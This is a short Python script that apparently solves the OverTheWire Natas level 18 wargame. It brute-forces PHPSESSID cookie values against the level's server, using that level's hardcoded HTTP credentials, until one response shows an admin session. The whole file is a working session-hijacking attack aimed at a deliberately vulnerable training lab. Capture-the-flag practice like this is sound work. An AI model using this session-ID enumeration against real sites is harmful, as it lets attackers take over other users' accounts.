#!/bin/python3

import requests

maxid = 641
url = "http://natas18.natas.labs.overthewire.org"
user = "natas18"
passwd = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
key = 'PHPSESSID'
match = "You are an admin. The credentials for the next level are:"


for i in range(maxid):
	c = dict(PHPSESSID=str(i))
	httpreq = requests.get(url, auth=(user, passwd), cookies=c)
	print (i)
	if match in httpreq.content:
		print (httpreq.content)
		break


	
